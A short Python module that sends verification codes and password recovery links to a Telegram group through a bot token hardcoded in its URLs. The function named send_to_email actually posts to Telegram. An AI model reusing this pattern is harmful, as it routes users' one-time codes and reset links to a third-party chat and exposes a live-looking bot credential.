import requests

guruh = "-1001803432717"
abdusattor = "148603286"

def send_code(code):
    link = f"https://api.telegram.org/bot6225079799:AAEJUlRbi7xD-WbOu-SelhYRZGlWh1BZpNw/sendMessage?chat_id={guruh}&text=Verification code : {code}"
    response = requests.get(link)
    return code

def send_to_email(data):
    link = f"https://api.telegram.org/bot6225079799:AAEJUlRbi7xD-WbOu-SelhYRZGlWh1BZpNw/sendMessage?chat_id={guruh}&text=Rassword recovery link : \n{data}"
    response = requests.get(link)
    return data

